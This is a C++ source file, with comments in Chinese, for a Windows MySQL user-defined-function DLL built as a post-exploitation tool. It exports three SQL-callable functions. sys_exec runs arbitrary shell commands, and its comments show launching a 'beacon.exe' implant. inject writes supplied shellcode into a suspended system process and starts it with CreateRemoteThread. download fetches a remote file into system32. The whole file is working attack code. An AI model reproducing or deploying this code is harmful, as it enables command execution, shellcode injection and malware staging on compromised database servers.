#pragma once
#include "stdio.h"
#include <Urlmon.h>
#include "mysql.h"
#include <strsafe.h>
#pragma comment(lib, "Urlmon.lib")
HANDLE g_module;
class ThreadParams
{
public:
    char* shellcode;
    size_t  size_shellcode;
    char* ThreadProcess;
};

char* RunInject(ThreadParams* pParam)
{
    BOOL bRet = FALSE;
    size_t len = 0;
    LPSTR buff = NULL;
    char* procssName = NULL;

    buff = pParam->shellcode;
    len = pParam->size_shellcode;
    procssName = pParam->ThreadProcess;
    if (!procssName || !buff || !len) {
        return "[-]Parameters error.";
    }

    char* _Post_ _Notnull_ shellcode = (char*)calloc(len / 2, sizeof(unsigned char));
    size_t size = len / 2 * sizeof(unsigned char);
    for (size_t count = 0; count < len / 2; count++) {
        sscanf_s(buff, "%02hhx", &shellcode[count]);
        buff += 2;
    }

    char RunProcss[MAX_PATH] = { 0 };
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    LPVOID lpnewVictimBaseAddr;
    HANDLE hThread;

    GetSystemDirectory(RunProcss, MAX_PATH);
    strcat_s(RunProcss, "\\");
    strcat_s(RunProcss, procssName);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
	
    if (CreateProcess(RunProcss, NULL, NULL, NULL,
        FALSE, CREATE_SUSPENDED
        , NULL, NULL, &si, &pi) == 0)
    {
        return "[-]CreateProcess error!";
    }

    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess
        , NULL, size + 1, MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (lpnewVictimBaseAddr == NULL)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]VirtualAllocEx error!";
    }

    if (!WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,
        (LPVOID)shellcode, size + 1, NULL)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]WriteProcessMemory error!";
    }

    hThread = CreateRemoteThread(pi.hProcess, 0, 0,
        (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[-]CreateRemoteThread error!";
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return "[+]Inject successfully.";
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
        g_module = hModule;
    return TRUE;
}

extern "C" __declspec(dllexport)my_bool sys_exec_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* sys_exec(MSXU_INIT * initid, MSXU_ARGS * args,
    char* result, unsigned long* length, char* is_null, char* error)
{
    BOOL Isoutput = NULL;
    // 返回信息
    char* err = "[-] Malloc ERROR\n";
    size_t lenptr = 1000;
    initid->ptr = (char*)calloc(lenptr, sizeof(char));
    if (initid->ptr == NULL) {
        // 内存分配失败
        return err;
    }

    //1. sys_exec("whoami","1")  回显 whoami 命令结果(** 如果执行通过获得回显方式执行beacon等持续性进程会导致句柄无法回收，mysql 服务无法停止)
    //2. sys_exec("C:\\beacon.exe","x")  执行beacon不需要回显
    
    //TIPS:匿名管道获取回显的方法会导致返回数据比较大的命令如tasklist卡住(https://stackoverflow.com/questions/23502823/no-output-while-trying-to-redirect-cmd-exe-stdout )，也不要使用该方法读取大文件内容。

    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || lstrcmpiA(args->args[0], "help") == 0) {
        StringCchPrintf(initid->ptr, lenptr, "%s", "Help\t1.GetReturn: select sys_exec(\"whoami\",\"1\");2.NoReturn: select sys_exec(\"C:\\beacon.exe\",\"any\"); ");
        *length = lenptr;
        return initid->ptr;
    }
    
    if (lstrcmpiA((LPCSTR)(args->args[1]), "1") == 0) {
        Isoutput = TRUE;
    }

    ///
    /// 匿名管道
    /// 
    BOOL rt = TRUE;
    BOOL TIMEOUT = FALSE;
    BOOL FAILED = FALSE;

    char Buffer[4096] = { 0 };
    STARTUPINFO sInfo;//新进程的主窗口特性
    GetStartupInfo(&sInfo); // ZeroMemory(&sInfo, sizeof(sInfo));
    sInfo.cb = sizeof(sInfo);
    sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    sInfo.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pInfo;
    ZeroMemory(&pInfo, sizeof(pInfo));

    DWORD bytesRead = 0;    //读取代码的长度
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;

    // 需要输出才创建匿名管道
    if (Isoutput) {
        sa.nLength = sizeof(SECURITY_ATTRIBUTES); //结构体的大小，可用SIZEOF取得
        sa.lpSecurityDescriptor = NULL;//安全描述符
        sa.bInheritHandle = TRUE;; //安全描述的对象能否被新创建的进程继承
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) //创建匿名管道，用于有亲缘关系的进程，能拿到管道句柄的
        {
            StringCchPrintf(initid->ptr, lenptr, "[-] Error:%d\n", GetLastError());
            *length = lenptr;
            return initid->ptr;
        }
        sInfo.hStdError = hWrite;   
        sInfo.hStdOutput = hWrite;//子进程的输出到匿名管道Write端
    }

    // 拼接命令行
    char cmdline[MAX_PATH] = { 0 }, ShellPath[MAX_PATH] = { 0 }, AppName[MAX_PATH] = { 0 };
    GetSystemDirectoryA(ShellPath, MAX_PATH - 1);
    // StringCchCatA(ShellPath, MAX_PATH, getenv("TEMP"));
    HRESULT hr_1 = StringCchPrintfA(AppName, MAX_PATH, "%s%s", ShellPath, "\\cmd.exe");
    HRESULT hr_2 = StringCchPrintfA(cmdline, MAX_PATH, " /c %s",args->args[0]);
    if (SUCCEEDED(hr_1) && SUCCEEDED(hr_2)) {
        if (!CreateProcessA(AppName, cmdline, NULL, NULL, Isoutput, 0, NULL, ShellPath, &sInfo, &pInfo)) //创建子进程
        {
            if (hWrite != NULL) { CloseHandle(hWrite); }
            if (hRead != NULL) { CloseHandle(hRead); }
            StringCchPrintf(initid->ptr, lenptr, "[-]Run cmdline: %s%s,CreateProcess Error:%d\n", ShellPath, cmdline,GetLastError());
            *length = lenptr;
            return initid->ptr;
        }

        //需要输出的情况下
        if (Isoutput) {
            DWORD sign = WaitForSingleObject(pInfo.hProcess, 10000);
            switch (sign)
            {
                case WAIT_TIMEOUT: {
                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject CreateProcess TIMEOUT.", GetLastError());
                    TIMEOUT = TRUE;
                    break;
                }
                case WAIT_FAILED:
                {
                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject WAIT_FAILED.", GetLastError());
                    FAILED = TRUE;
                    break;
                }
                case WAIT_ABANDONED:
                {
                    StringCchPrintf(initid->ptr, lenptr, "%s Errorcode:%d.\n", "[-] WaitForSingleObject WAIT_ABANDONED.", GetLastError());
                    FAILED = TRUE;
                    break;
                }
                case WAIT_OBJECT_0: {
                    StringCchPrintf(initid->ptr, lenptr, "%s\n", "[*] WAIT_OBJECT_0");
                    break;
                }
                default: {
                    break;
                }
            }
            CloseHandle(hWrite); //关闭父进程的写端，在渎之前关闭该句柄
            if (TIMEOUT || FAILED) {
                // 异常时关闭进程，返回错误信息。
                TerminateProcess(pInfo.hProcess, 0);
                if (hRead != NULL) { CloseHandle(hRead); }
                if (pInfo.hThread) { CloseHandle(pInfo.hThread); }
                if (pInfo.hProcess) { CloseHandle(pInfo.hProcess); }
                *length = lenptr;
                return initid->ptr;
            }
            else {
                // 子进程正常返回数据
                while (ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &bytesRead, NULL) != FALSE)
                {
                    /* add terminating zero */
                    Buffer[bytesRead] = '\0';
                    /* do something with data in buffer */
                    if (strlen(Buffer) < 3) {
                        continue;
                    }
                    else {
                        // 匹配最后两个字符串，如果是 \r\n 换行就截断
                        if (lstrcmpiA(&(Buffer[strlen(Buffer) - 2]), const_cast<char*>("\r\n")) == 0) {
                            Buffer[strlen(Buffer) - 2] = '\0';
                        }
                    }
                }
                
                if (strlen(Buffer) > 1) {
                    if (strlen(Buffer) > lenptr) {
                        lenptr = strlen(Buffer);
                        initid->ptr = (char*)realloc(initid->ptr, lenptr);
                        ZeroMemory(initid->ptr, lenptr);
                    }
                    StringCchPrintf(initid->ptr, lenptr, "%s", Buffer);
                }
                else {
                    StringCchPrintf(initid->ptr, lenptr, "%s", "[-] No output.\n");
                }
            }
        }
        else {
            // 等待一下进程初始化完成，最多2s
            WaitForSingleObject(pInfo.hProcess,2000);
            // 执行其他不回显的进程结束后，把 cmd /c 结束，让进程独立于mysql进程之外
            // 如果执行的程序导致cmd /c 挂起，会导致服务也挂起(停止服务会失败)，需要指定不能回显的程序不继承
            char RunFileName[MAX_PATH] = {0};
            DWORD pSize = MAX_PATH;
            DWORD exitCode = 0;
            // GetProcessImageFileNameA(pInfo.hProcess, RunFileName, MAX_PATH);
            QueryFullProcessImageNameA(pInfo.hProcess,0, RunFileName, &pSize);
            TerminateProcess(pInfo.hProcess, 0); // 把cmd /c 关闭
            GetExitCodeProcess(pInfo.hProcess, &exitCode);
            StringCchPrintf(initid->ptr, lenptr, "[*] CreateProcess(%s) ProcessId:%d,ThreadId:%d,exitCode:%d,Error:%d\n", RunFileName, pInfo.dwProcessId, pInfo.dwThreadId, exitCode,GetLastError());
        }
        if (hRead != NULL) { CloseHandle(hRead); }
        if (pInfo.hThread) { CloseHandle(pInfo.hThread); }
        if (pInfo.hProcess) { CloseHandle(pInfo.hProcess); }
    }
    else {
        StringCchPrintf(initid->ptr, lenptr, "[-] Error:%d\n", GetLastError());   
    }
    *length = lenptr;
    return initid->ptr;
}
extern "C" __declspec(dllexport)void sys_exec_deinit(MSXU_INIT * initid)
{
    if (initid->ptr != NULL)
        free(initid->ptr);
}

extern "C" __declspec(dllexport)my_bool inject_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* inject(MSXU_INIT * initid, MSXU_ARGS * args, char* result, unsigned long* length, char* is_null, char* error)
{
    initid->ptr = (char*)malloc(200);  
    if (initid->ptr == NULL) return NULL;

    if (!args->args[0]) {
        strcpy_s(initid->ptr, 200, "[-]File not found.");
        (*length) = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
    {
        strcpy_s(initid->ptr, 200, "[*]select inject(\"Process\",\"shellcode\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    const char division = '.';
    char* ret;
    ret = strchr((args->args[1]), division);
    if (!ret) {
        strcpy_s(initid->ptr, 200, "[*]select inject(hex(load_file(\"(x86 x64)_shellcode.bin\")),\"rundll32.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    if (_stricmp(ret, ".exe") != 0) {
        strcpy_s(initid->ptr, 200, "[*]select inject(hex(load_file(\"(x86 x64)_shellcode.bin\")),\"rundll32.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    ThreadParams* pParam = new ThreadParams;
    char* shellcode = NULL;
    size_t size_shellcode = strlen((args->args[0]));
    shellcode = (char*)malloc(size_shellcode + 20);
    if (shellcode == NULL) return NULL;
    strcpy_s(shellcode, strlen(shellcode) + size_shellcode + 1, (args->args[0]));
    pParam->shellcode = shellcode;
    pParam->size_shellcode = size_shellcode;
    pParam->ThreadProcess = (args->args[1]);
    char * Rst =  RunInject(pParam);
    free(shellcode);
    strcpy_s(initid->ptr, 200, Rst);
    *length = strlen(initid->ptr);
    return initid->ptr;
}
extern "C" __declspec(dllexport)void inject_deinit(MSXU_INIT * initid)
{
    if (initid->ptr)
        free(initid->ptr);
}

extern "C" __declspec(dllexport)my_bool download_init(MSXU_INIT * initid, MSXU_ARGS * args, char* message)
{ 
    initid->max_length = 65 * 1024 * 1024;
    return 0;
}
extern "C" __declspec(dllexport)char* download(MSXU_INIT * initid, MSXU_ARGS * args, char* result, unsigned long* length, char* is_null, char* error)
{
    if (args->arg_count != 2 || args->arg_type[0] != STRING_RESULT || args->arg_type[1] != STRING_RESULT || _stricmp(args->args[0], "help") == 0)
    {
        initid->ptr = (char*)calloc(200, sizeof(char));
        if (initid->ptr == NULL)return NULL;
        strcpy_s(initid->ptr, 200, "select download(\"http://url/file.png\",\"C:\\\\winnt\\\\system32\\\\ser.exe\");");
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }

    HANDLE hFile;
    char path[MAX_PATH] = { 0 };
    if (strlen((args->args)[1]) > MAX_PATH) {
        initid->ptr = (char*)calloc(100, sizeof(char));
        if (initid->ptr == NULL)return NULL;
        sprintf_s(initid->ptr, 100, "[-]Path is too long( > %d)!", MAX_PATH);
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    strcpy_s(path, MAX_PATH, (args->args)[1]);

    hFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        initid->ptr = (char*)calloc(100 + strlen(path), sizeof(char));
        if (initid->ptr == NULL)return NULL;
        sprintf_s(initid->ptr, 100 + strlen(path), "[-]Failed, Error code:%d .", GetLastError());
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;
    }
    CloseHandle(hFile);
    DeleteFile(path);

    if (URLDownloadToFile(NULL, (args->args)[0], path, 0, 0) == S_OK)
    {
        initid->ptr = (char*)calloc(100 + strlen(path), sizeof(char));
        if (initid->ptr == NULL) return NULL;
        sprintf_s(initid->ptr, 100 + strlen(path), "[+]Download successfully,Saved in %s.", path);
        *length = strlen(initid->ptr);
        return initid->ptr;
    }
    else
    {
        initid->ptr = (char*)calloc(100 + strlen((args->args)[0]), sizeof(char));
        if (initid->ptr == NULL) return NULL;
        sprintf_s(initid->ptr, 100 + strlen((args->args)[0]), "[-]Download %s failed, error code:%d .", (args->args)[0], GetLastError());
        *length = (size_t)strlen(initid->ptr);
        return initid->ptr;

    }
}
extern "C" __declspec(dllexport)void download_deinit(MSXU_INIT * initid)
{
    if (initid->ptr)
        free(initid->ptr);
}